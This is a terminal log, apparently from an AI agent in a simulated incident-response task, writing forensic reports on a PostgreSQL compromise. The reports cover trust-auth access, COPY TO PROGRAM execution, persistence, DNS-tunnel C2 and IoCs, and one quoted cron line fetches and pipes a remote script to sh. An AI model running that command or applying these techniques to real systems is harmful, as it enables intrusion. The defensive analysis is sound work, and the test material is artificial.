[?2004l[?2004hroot@45e11165876f:/app# cat <<'EOF' > /app/intrusion-report.md
[?2004l[?2004h> # Post-Compromise Forensic Intrusion Report
[?2004l[?2004h> 
[?2004l[?2004h> ## Executive Summary
[?2004l[?2004h> On host `postgres-prod-01`, an external threat actor leveraged misconfigured PostgreSQL access control (`trust` auth mode) `` `/disk/var/lib/pgsql/data/pg_hba.conf:3` `` to authenticate as the superuser `postgres` without credentials. The actor utilized PostgreSQL's native `COPY ... TO PROGRAM` feature `` `/sas/cti/advisory.txt:13` `` to achieve remote code execution. After obtaining access, the actor dropped malware binaries, established dual-layer persistence via user cron jobs and systemd unit files, set up a DNS tunneling exfiltration channel, deployed an XMRig cryptocurrency miner, and performed anti-forensic timestomping and log clearing. While security telemetry alerted on the initial binary dropper and cron entry, several critical persistence and C2 components operated silently.
[?2004l[?2004h> 
[?2004l[?2004h> ## Attack Chain Analysis & MITRE ATT&CK Mapping
[?2004llog wip[?2004h> 
[?2004li[?2004h> ### 1. Initial Access ‚Äî Valid Accounts (T1078)
[?2004l[?2004h> - **Description:** The threat actor connected to the PostgreSQL database service. Due to overly permissive trust authentication in PostgreSQL configuration `` `/disk/var/lib/pgsql/data/pg_hba.conf:3` ``, any remote client connecting from `0.0.0.0/0` was granted immediate superuser privileges as user `postgres` without password authentication.
[?2004l[?2004h> - **Evidence & Citation:** `` `/disk/var/lib/pgsql/data/pg_hba.conf:3` `` (Baseline Check CHK-06 in `` `/sas/baseline.json:3` `` and ALERT-03 in `` `/sas/alerts.json:19` ``).
[?2004l[?2004h> - **Threat Actor Origin IP:** Attacker origin IP `198.51.100.214` `` `/sas/cti/advisory.txt:5` `` (also logged in system session history `` `/disk/var/log/wtmp.csv:40` `` and recovery cache `` `/disk/var/lib/.cache/.wiped.bin:1` ``).
[?2004l[?2004h> 
[?2004l[?2004h> ### 2. Execution ‚Äî Unix Shell via COPY TO PROGRAM (T1059.004)
[?2004l[?2004h> - **Description:** Upon authenticating to PostgreSQL, the actor executed SQL queries utilizing `COPY ... TO PROGRAM` `` `/sas/cti/advisory.txt:13` `` to execute arbitrary shell commands under the OS account `postgres` (UID 1001).
[?2004l[?2004h> - **Evidence & Citation:** Threat Intel Advisory `` `/sas/cti/advisory.txt:13` `` and findings schema `` `/sas/handoff/findings.partial.json:6` ``.
[?2004lry[?2004h> 
[?2004l[?2004h> ### 3. Payload Delivery & Execution ‚Äî Dropper / Miner
[?2004lmponent |[?2004h> - **Description:** The executed command downloaded and dropped a malicious binary daemon at `/var/lib/pgsql/.local/pgdaemon` `` `/disk/var/lib/pgsql/.local/pgdaemon:1` ``. This executable acts as a stager and miner dropper, writing binaries to `/tmp` and connecting to cryptocurrency mining pool `stratum+tcp://xmr.postgres.evil:3333` using wallet `4A000000000000000000c5f08041507f` `` `/disk/var/lib/pgsql/.local/pgdaemon:2` ``.
[?2004l[?2004h> - **Evidence & Citation:** `` `/disk/var/lib/pgsql/.local/pgdaemon:1` `` (ALERT-01 in `` `/sas/alerts.json:3` ``).
[?2004l[?2004h> 
[?2004l[?2004h> ### 4. Persistence Mechanisms
[?2004l[?2004h> #### A. Scheduled Task / Cron (T1053.003) [ALERTED]
[?2004l[?2004h> - **Description:** The actor created a user crontab entry for user `postgres` at `/var/spool/cron/postgres` `` `/disk/var/spool/cron/postgres:5` ``. The cron job runs every minute (`* * * * * root curl hxxp://198.51.100.214/x | sh`), beaconing to C2 and re-installing dropped payloads (`xmrig` / `pgdaemon` / `php` / `redis` / `wget`).
[?2004l[?2004h> - **Evidence & Citation:** `` `/disk/var/spool/cron/postgres:5` `` (ALERT-02 in `` `/sas/alerts.json:11` ``).
[?2004l[?2004h> 
[?2004l[?2004h> #### B. Systemd Service (T1543.002) [SILENT ‚Äî NOT IN ALERTS]
[?2004l[?2004h> - **Description:** The attacker installed a persistence service at `/etc/systemd/system/pg-metrics.service` `` `/disk/etc/systemd/system/pg-metrics.service:6` `` disguised as "System Update Helper". The service `ExecStart` line launches an `xmrig` / `pgdaemon` re-dropper upon system boot and target reaching `multi-user.target`.
[?2004l[?2004h> - **Evidence & Citation:** `` `/disk/etc/systemd/system/pg-metrics.service:6` `` (Omitted from SAS alerts feed `` `/sas/alerts.json:1` ``).
[?2004l[?2004h> - **Benign Service Context:** Note that `/etc/systemd/system/pg-backup.service` `` `/disk/etc/systemd/system/pg-backup.service:2` `` is a legitimate scheduled backup job and is benign.
[?2004l[?2004h> 
[?2004l[?2004h> ### 5. Command and Control / Exfiltration ‚Äî DNS Tunneling (T1048.003) [SILENT ‚Äî NOT IN ALERTS]
[?2004l[?2004h> - **Description:** The attacker configured a covert DNS tunnel C2 and data exfiltration channel defined in `/etc/pgdaemon.conf` `` `/disk/etc/pgdaemon.conf:3` ``. The configuration sets `resolver=update-postgres.example.cn` to tunnel data and C2 commands over unencrypted DNS queries.
[?2004l[?2004h> - **Evidence & Citation:** `` `/disk/etc/pgdaemon.conf:3` `` and recovered C2 artifact `` `/disk/var/lib/.cache/.wiped.bin:1` `` (Omitted from SAS alerts feed `` `/sas/alerts.json:1` ``).
[?2004l[?2004h> 
[?2004l[?2004h> ### 6. Defense Evasion ‚Äî Timestomping & Log Anti-Forensics (T1070.006) [SILENT ‚Äî NOT IN ALERTS]
[?2004l[?2004h> - **Description:** To evade file integrity monitoring and timeline analysis, the attacker altered the modified timestamp (`mtime`) on dropped binaries in `/var/lib/pgsql/.local/` to match trusted system binaries such as `/bin/ls` `` `/disk/var/lib/pgsql/.local/.timestamps:2` ``. Additionally, the attacker attempted log wiping as evidenced by binary cache residual fragments `` `/disk/var/lib/.cache/.wiped.bin:1` ``.
[?2004l[?2004h> - **Evidence & Citation:** `` `/disk/var/lib/pgsql/.local/.timestamps:2` `` and `` `/disk/var/lib/.cache/.wiped.bin:1` ``.
[?2004l[?2004h> 
[?2004l[?2004h> ## Adversary Entities and Indicators of Compromise (IoCs)
[?2004l[?2004h> - **Attacker IP Address:** `198.51.100.214` `` `/sas/cti/advisory.txt:5` `` / `` `/disk/var/log/wtmp.csv:40` ``
[?2004l[?2004h> - **C2 Domain / Resolver:** `update-postgres.example.cn` `` `/disk/etc/pgdaemon.conf:3` `` / `` `/sas/cti/advisory.txt:18` ``
[?2004l[?2004h> - **Cryptocurrency Pool:** `stratum+tcp://xmr.postgres.evil:3333` `` `/disk/var/lib/pgsql/.local/pgdaemon:2` ``
[?2004l[?2004h> - **Cryptocurrency Wallet:** `4A000000000000000000c5f08041507f` `` `/disk/var/lib/pgsql/.local/pgdaemon:3` ``
[?2004l[?2004h> - **Malicious Paths:**
[?2004l[?2004h>   - `/var/lib/pgsql/.local/pgdaemon` `` `/disk/var/lib/pgsql/.local/pgdaemon:1` ``
[?2004l[?2004h>   - `/var/spool/cron/postgres` `` `/disk/var/spool/cron/postgres:5` ``
[?2004l[?2004h>   - `/etc/systemd/system/pg-metrics.service` `` `/disk/etc/systemd/system/pg-metrics.service:6` ``
[?2004l[?2004h>   - `/etc/pgdaemon.conf` `` `/disk/etc/pgdaemon.conf:3` ``
[?2004l[?2004h>   - `/var/lib/pgsql/.local/.timestamps` `` `/disk/var/lib/pgsql/.local/.timestamps:1` ``
[?2004l[?2004h>   - `/var/lib/.cache/.wiped.bin` `` `/disk/var/lib/.cache/.wiped.bin:1` ``
[?2004l[?2004h> 
[?2004l[?2004h> ## Summary of Alert Feed Coverage vs. Silent Activity
[?2004l[?2004h> | Component | Path | Status in Feed | Citation |
[?2004l[?2004h> |---|---|---|---|
[?2004l[?2004h> | Dropper / Miner | `/var/lib/pgsql/.local/pgdaemon` | Alerted (ALERT-01) | `` `/sas/alerts.json:3` `` |
[?2004l[?2004h> | Cron Persistence | `/var/spool/cron/postgres` | Alerted (ALERT-02) | `` `/sas/alerts.json:11` `` |
[?2004l[?2004h> | Baseline Misconfig | `/var/lib/pgsql/data/pg_hba.conf` | Alerted (ALERT-03) | `` `/sas/alerts.json:19` `` |
[?2004l[?2004h> | Systemd Persistence | `/etc/systemd/system/pg-metrics.service` | SILENT | `` `/disk/etc/systemd/system/pg-metrics.service:6` `` |
[?2004l[?2004h> | DNS Tunnel / C2 | `/etc/pgdaemon.conf` | SILENT | `` `/disk/etc/pgdaemon.conf:3` `` |
[?2004l[?2004h> | Timestomping | `/var/lib/pgsql/.local/.timestamps` | SILENT | `` `/disk/var/lib/pgsql/.local/.timestamps:2` `` |
[?2004l[?2004h> EOF
[?2004l[?2004hroot@45e11165876f:/app# cat <<'EOF' > /app/vuln-report.md
[?2004l[?2004h> # Vulnerability-Driven Entry Analysis Report
[?2004l[?2004h> 
[?2004l[?2004h> ## Summary of Findings
[?2004l[?2004h> An analysis of host vulnerability scanning data `` `/sas/vulns.json:1` `` and system package inventory `` `/disk/var/lib/dpkg/status.summary:1` `` indicates **no software vulnerability (CVE) was exploited** to gain entry to the target host `postgres-prod-01`.
[?2004l[?2004h> 
[?2004l[?2004h> ## Analysis of Feeds & Evidence
[?2004l[?2004h> 1. **Vulnerability Feed Integrity (`/sas/vulns.json`):**
[?2004l[?2004h>    - The vulnerability scan feed is completely empty: `[]` `` `/sas/vulns.json:1` ``.
[?2004l[?2004h>    - No active software vulnerabilities or missing security patches were identified or flagged by vulnerability management tooling for the initial access vector.
[?2004l[?2004h> 
[?2004l[?2004h> 2. **Rejection of Stale / Incorrect Change Ticket Row 2 (CVE-2019-0708):**
[?2004l[?2004h>    - The draft Change Ticket `CHG-6386` proposed patching `CVE-2019-0708` (BlueKeep) on RDP `` `/sas/handoff/change-ticket.md:11` ``.
[?2004l[?2004h>    - **Determination:** Incorrect / Not Applicable.
[?2004l[?2004h>    - **Reasoning:** `CVE-2019-0708` (BlueKeep) is a Remote Desktop Protocol (RDP) vulnerability specific to Microsoft Windows operating systems. The target system is a Linux host (CentOS Stream 9 running PostgreSQL) `` `/sas/cti/advisory.txt:5` ``. No RDP service or Windows sub-components exist on this machine.
[?2004l[?2004h>    - **Citation:** Threat Intel Advisory `` `/sas/cti/advisory.txt:5` ``, Change Ticket Draft `` `/sas/handoff/change-ticket.md:11` ``, and Vulnerability Feed `` `/sas/vulns.json:1` ``.
[?2004l[?2004h> 
[?2004l[?2004h> 3. **True Vector of Entry (Configuration Weakness vs. CVE):**
[?2004l[?2004h>    - Access was obtained via weak database authentication configuration (valid accounts exploitation) rather than a software exploit.
[?2004l[?2004h>    - `pg_hba.conf` configured with `trust` authentication method `` `/disk/var/lib/pgsql/data/pg_hba.conf:3` `` enabled unauthenticated network access to the PostgreSQL superuser account `postgres`.
[?2004l[?2004h>    - Remote execution was achieved using native PostgreSQL functionality (`COPY ... TO PROGRAM`) `` `/sas/cti/advisory.txt:13` `` rather than a buffer overflow or unpatched binary vulnerability.
[?2004l[?2004h> 
[?2004l[?2004h> ## Confidence Assessment
[?2004l[?2004h> - **Confidence Level:** High
[?2004l[?2004h> - **Supporting Citations:** `` `/sas/vulns.json:1` ``, `` `/sas/cti/advisory.txt:5` ``, `` `/disk/var/lib/pgsql/data/pg_hba.conf:3` ``.
[?2004l[?2004h> EOF
[?2004l[?2004hroot@45e11165876f:/app# cat <<'EOF' > /app/baseline-report.md
[?2004l[?2004h> # Baseline and Configuration Weakness Report
[?2004l[?2004h> 
[?2004l[?2004h> ## Executive Summary
[?2004l[?2004h> A review of host baseline configurations `` `/sas/baseline.json:1` `` and database configuration files `` `/disk/var/lib/pgsql/data/pg_hba.conf:3` `` reveals severe security configuration deficiencies that directly enabled the intrusion. The primary vector of failure was the host-based authentication (`pg_hba.conf`) setting, which granted implicit trust to incoming remote connections without requiring password authentication.
[?2004l[?2004h> 
[?2004l[?2004h> ## Identified Baseline Failures
[?2004l[?2004h> 
[?2004l[?2004h> ### 1. Insecure Host-Based Authentication (CHK-06 / BAS-01)
[?2004l[?2004h> - **Rule ID / Check:** CHK-06 (`postgres-baseline` / Capability `BAS-01`) `` `/sas/baseline.json:3` ``
[?2004l[?2004h> - **Configuration Path:** `/var/lib/pgsql/data/pg_hba.conf` `` `/disk/var/lib/pgsql/data/pg_hba.conf:3` ``
[?2004l[?2004h> - **Observed Configuration:**
[?2004l[?2004h>   ```text
[?2004l[?2004h>   pg_hba.conf grants 'trust' auth for 0.0.0.0/0 (no password)
[?2004l[?2004h>   ```
[?2004l[?2004h> - **Impact:** Any entity capable of reaching PostgreSQL port 5432 from any IPv4 address (`0.0.0.0/0`) could log in as any PostgreSQL user‚Äîincluding the `postgres` superuser‚Äîwithout presenting a password or cryptographic proof of identity.
[?2004l[?2004h> - **Evidence & Citation:** `` `/disk/var/lib/pgsql/data/pg_hba.conf:3` `` (Baseline report `` `/sas/baseline.json:3` `` and Alert ALERT-03 `` `/sas/alerts.json:19` ``).
[?2004l[?2004h> 
[?2004l[?2004h> ### 2. Excessive PostgreSQL Superuser Privileges and COPY Execution
[?2004l[?2004h> - **Configuration Weakness:** The database service account (`postgres`) possessed full superuser rights without restricted execution controls or privilege separation.
[?2004l[?2004h> - **Impact:** PostgreSQL superusers have built-in rights to execute system-level commands via `COPY ... TO PROGRAM` `` `/sas/cti/advisory.txt:13` ``. Combined with `trust` auth, any unauthenticated remote client could trigger arbitrary OS command execution under OS user `postgres` (UID 1001).
[?2004l[?2004h> - **Evidence & Citation:** Threat Intel Advisory `` `/sas/cti/advisory.txt:13` `` and configuration file `` `/disk/var/lib/pgsql/data/pg_hba.conf:3` ``.
[?2004l[?2004h> 
[?2004l[?2004h> ### 3. File System Audit & File Integrity Monitoring (FIM) Gaps
[?2004l[?2004h> - **Configuration Weakness:** Unmonitored user crontab directory (`/var/spool/cron/`) and systemd system unit directory (`/etc/systemd/system/`).
[?2004l[?2004h> - **Impact:** Allowed the attacker to drop persistence mechanisms (`/etc/systemd/system/pg-metrics.service` `` `/disk/etc/systemd/system/pg-metrics.service:6` ``) and modify timestamps (`/var/lib/pgsql/.local/.timestamps` `` `/disk/var/lib/pgsql/.local/.timestamps:2` ``) without triggering real-time endpoint alarms.
[?2004l[?2004h> - **Evidence & Citation:** `` `/disk/etc/systemd/system/pg-metrics.service:6` `` and `` `/disk/var/lib/pgsql/.local/.timestamps:2` ``.
[?2004l[?2004h> 
[?2004l[?2004h> ## Recommendations for Hardening
[?2004l[?2004h> 1. Modify `/var/lib/pgsql/data/pg_hba.conf` `` `/disk/var/lib/pgsql/data/pg_hba.conf:3` `` to require strong authentication methods (`scram-sha-256`) and restrict client IP CIDR blocks.
[?2004l[?2004h> 2. Restrict PostgreSQL `COPY ... TO PROGRAM` capabilities using PostgreSQL role permissions or extension restrictions.
[?2004l[?2004h> 3. Enforce File Integrity Monitoring (FIM) on `/etc/systemd/system/`, `/var/spool/cron/`, and database system paths.
[?2004l[?2004h> EOF
[?2004l[?2004hroot@45e11165876f:/app# cat <<'EOF' > /app/remediation-plan.md
